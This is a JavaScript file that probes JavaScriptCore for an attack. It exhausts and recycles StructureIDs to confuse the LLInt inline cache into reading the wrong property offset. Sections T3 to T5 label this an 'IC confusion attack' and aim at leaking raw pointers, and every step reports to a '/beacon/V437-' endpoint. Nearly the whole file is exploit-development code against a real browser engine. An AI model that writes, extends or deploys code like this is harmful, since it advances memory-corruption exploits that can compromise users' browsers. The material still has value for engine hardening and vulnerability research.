/*
 * p437 -- StructureID exhaustion and recycling probe
 *
 * JSC inline cache (LLInt get_by_id) trusts StructureID matches.
 * If we exhaust the StructureID table and force recycling, a new
 * object with recycled ID passes the IC check -> reads wrong offset.
 *
 * This is BELOW the JS builtin layer: the IC comparison happens in
 * the LLInt before any JS type checks.
 *
 * Tests:
 *   T1: How many unique structures can we create?
 *       Each object with a unique property name set gets a unique Structure.
 *   T2: Can GC collect unused Structures and free their IDs?
 *       Create many structures, drop refs, GC, create more.
 *   T3: IC confusion detection.
 *       Create object A with prop 'x' at known offset.
 *       Warm IC on function reading A.x.
 *       Create 100K+ structures to exhaust+recycle A's ID.
 *       Create object B with recycled ID, different layout.
 *       Call function with B -> if IC hits, reads wrong property.
 *   T4: StructureID enumeration.
 *       Create objects with unique structures, check if we can
 *       detect when IDs wrap around.
 *
 * Beacon prefix: V437-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V437-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// T1: Maximum unique structure count
// Each object with a unique set of property names gets a new Structure.
// Use incrementing property names: {p0:1}, {p0:1,p1:1}, etc.
// ================================================================
function T1() {
  B("T1-START");
  var count = 0;
  var batch = 10000;
  var MAX = 500000;
  var holders = [];

  try {
    for (var i = 0; i < MAX; i++) {
      var o = {};
      o["p" + i] = 1;
      holders.push(o);
      count++;
      if (count % batch === 0) {
        B("T1-COUNT", count);
      }
    }
  } catch(e) {
    B("T1-OOM", {count: count, err: e.message.slice(0, 60)});
  }

  B("T1-FINAL", count);
  // Don't drop holders yet -- T2 will
  return holders;
}

// ================================================================
// T2: Structure GC and ID recycling
// Create many unique structures, drop refs, trigger GC, create more.
// If second batch creates more without OOM, structures were collected.
// ================================================================
function T2(holdersFromT1) {
  B("T2-START");

  // Phase 1: Drop all T1 references
  var t1count = holdersFromT1 ? holdersFromT1.length : 0;
  holdersFromT1 = null;

  // Phase 2: GC pressure
  B("T2-GC-START");
  for (var i = 0; i < 20; i++) {
    try { new ArrayBuffer(8 * 1024 * 1024); } catch(e) {}
  }
  B("T2-GC-DONE");

  // Phase 3: Create new unique structures
  var count = 0;
  var batch = 10000;
  var MAX = 100000;
  var holders2 = [];

  try {
    for (var i = 0; i < MAX; i++) {
      var o = {};
      o["r" + i] = 1; // Different prefix to guarantee new structure
      holders2.push(o);
      count++;
      if (count % batch === 0) {
        B("T2-RECOUNT", count);
      }
    }
  } catch(e) {
    B("T2-OOM", {count: count, err: e.message.slice(0, 60)});
  }

  B("T2-FINAL", {t1: t1count, t2: count, recycled: count > 0});
  return holders2;
}

// ================================================================
// T3: IC confusion attack
// The money shot: create object, warm inline cache, exhaust IDs,
// create recycled-ID object with different layout, trigger IC.
// ================================================================
function T3() {
  B("T3-START");

  // Step 1: Create victim object with known layout
  var victim = {x: 0x41414141, y: 0x42424242};
  B("T3-VICTIM", {x: victim.x, y: victim.y});

  // Step 2: Create a function and warm its IC
  // The function reads .x which should be at a specific offset
  // in victim's butterfly/inline storage.
  function readX(obj) { return obj.x; }

  // Warm the IC: call readX many times with same-structure objects
  for (var i = 0; i < 1000; i++) {
    var warmup = {x: i, y: i + 1};
    readX(warmup);
  }
  var cached = readX(victim);
  B("T3-CACHED", cached); // Should be 0x41414141

  // Step 3: Record which offset the IC learned
  // If the IC is warm, subsequent calls with same-structure objects
  // should use the cached offset without slow path.

  // Step 4: Exhaust StructureIDs
  // Each unique property set creates a new Structure with a new ID.
  // We need to create enough to wrap around the ID table.
  B("T3-EXHAUST-START");
  var exhaustCount = 0;
  var garbage = [];
  try {
    for (var i = 0; i < 200000; i++) {
      var o = {};
      o["exhaust_" + i] = 1;
      garbage.push(o);
      exhaustCount++;
    }
  } catch(e) {
    B("T3-EXHAUST-OOM", {count: exhaustCount, err: e.message.slice(0, 60)});
  }
  B("T3-EXHAUSTED", exhaustCount);

  // Drop garbage for GC
  garbage = null;

  // GC pressure to free exhausted structures
  for (var i = 0; i < 30; i++) {
    try { new ArrayBuffer(8 * 1024 * 1024); } catch(e) {}
  }
  B("T3-GC-DONE");

  // Step 5: Create new objects, hope one gets victim's recycled ID
  // Key: the new object needs property .x at a DIFFERENT offset
  // or a different property at offset 0 (where victim's .x was)
  var confused = [];
  for (var i = 0; i < 50000; i++) {
    // Create object with .secret at offset 0, then add .x at offset 1
    // If this object's StructureID happens to match victim's cached ID,
    // readX(confusedObj) will use victim's offset for .x, which might
    // read .secret instead (if .x is at a different offset in this layout)
    var o = {secret: 0xDEADBEEF, x: 0xCAFECAFE};
    confused.push(o);
  }
  B("T3-CONFUSED-CREATED", confused.length);

  // Step 6: Try the IC-confused read
  var hits = 0;
  var misses = 0;
  for (var i = 0; i < Math.min(confused.length, 1000); i++) {
    var result = readX(confused[i]);
    if (result === 0xDEADBEEF) {
      // IC confusion! readX used victim's offset for .x, but read .secret
      hits++;
      if (hits <= 3) {
        B("T3-CONFUSION!!!", {i: i, result: result, expected: 0xCAFECAFE});
      }
    } else if (result === 0xCAFECAFE) {
      misses++;
    } else {
      // Unexpected value -- possible memory corruption
      if (hits === 0 && misses < 3) {
        B("T3-UNEXPECTED", {i: i, result: result});
      }
    }
  }
  B("T3-RESULT", {hits: hits, misses: misses, total: Math.min(confused.length, 1000)});
}

// ================================================================
// T4: Transition chain leak
// A StructureID confusion on get_by_id could leak raw pointers
// if we can make the IC read from an ArrayBuffer's inline storage
// (where we control the bytes) instead of a regular object property.
// ================================================================
function T4() {
  B("T4-START");

  // Create a function that reads .length
  function readLen(obj) { return obj.length; }

  // Warm IC with arrays (Array.length is special but let's try)
  for (var i = 0; i < 500; i++) {
    readLen([1, 2, 3]);
  }
  B("T4-WARMED");

  // Now pass a string (has .length but different structure)
  var strResult = readLen("hello");
  B("T4-STRING", {result: strResult, type: typeof strResult});

  // Pass an ArrayBuffer wrapper
  var ab = new ArrayBuffer(64);
  var abResult = readLen(ab);
  B("T4-AB", {result: abResult, type: typeof abResult});

  // Pass a typed array
  var ta = new Float64Array(8);
  ta[0] = 1.1;
  var taResult = readLen(ta);
  B("T4-TA", {result: taResult, type: typeof taResult});

  B("T4-DONE");
}

// ================================================================
// T5: Property offset mismatch via Transition removal
// Create Structure chain A -> A+x -> A+x+y
// Warm IC on A+x+y with .x read.
// Delete property y from object -> structure changes.
// But if delete causes transition to A+x directly, and A+x has
// same StructureID as before... no confusion.
// The goal is to find a case where property offsets SHIFT.
// ================================================================
function T5() {
  B("T5-START");

  function readProp(obj) { return obj.a; }

  // Create objects with property 'a' at different inline offsets
  // by adding different properties before 'a'

  // Object type 1: {a: ...}  -- a is at offset 0
  var type1 = {a: 0x11111111};

  // Object type 2: {z: ..., a: ...}  -- a is at offset 1
  var type2 = {z: 0x99999999, a: 0x22222222};

  // Warm IC with type1
  for (var i = 0; i < 500; i++) {
    readProp({a: i});
  }
  var r1 = readProp(type1);
  B("T5-TYPE1", r1);

  // Now read from type2 -- should go slow path, re-cache for type2
  var r2 = readProp(type2);
  B("T5-TYPE2", {result: r2, expected: 0x22222222});

  // The IC is now cached for type2's structure.
  // Create an object that looks like type2's structure but has
  // different values at the property offsets.
  var type2b = {z: 0xAAAAAAAA, a: 0xBBBBBBBB};
  var r2b = readProp(type2b);
  B("T5-TYPE2B", {result: r2b, expected: 0xBBBBBBBB});

  B("T5-DONE");
}

// Run tests
T1_result = T1();
setTimeout(function() { T2(T1_result); T1_result = null; }, 1000);
setTimeout(function() { T3(); }, 5000);
setTimeout(function() { T4(); }, 10000);
setTimeout(function() { T5(); }, 12000);
setTimeout(function() { B("DONE"); }, 15000);
})();
